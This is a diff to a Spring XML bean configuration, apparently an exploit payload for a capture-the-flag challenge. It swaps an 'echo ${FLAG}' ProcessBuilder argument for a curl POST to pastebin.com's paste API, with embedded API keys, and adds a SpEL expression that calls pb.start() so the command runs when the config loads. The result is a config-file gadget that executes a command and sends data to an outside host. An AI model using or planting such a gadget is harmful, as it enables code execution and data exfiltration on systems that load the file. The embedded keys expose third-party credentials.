@@ -5,7 +5,7 @@
      http://www.springframework.org/schema/beans/spring-beans.xsd
 ">
   <bean id="pb" class="java.lang.ProcessBuilder">
-     <constructor-arg value="echo ${FLAG}" />
-     <property name="whatever" value="#{ pb.environment() }"/>
+     <constructor-arg value="curl -X POST https://pastebin.com/api/api_post.php -d 'api_dev_key=XSmWtTj6kCM2FLcwHZyvARd5WpB_RrIY&api_paste_code=123&api_option=paste&api_paste_private=0&api_user_key=e6807aba10120c035f8a12b666b85760&api_paste_name=dojackson'" />
+     <property name="whatever" value="#{ pb.start() }"/>
   </bean>
 </beans>
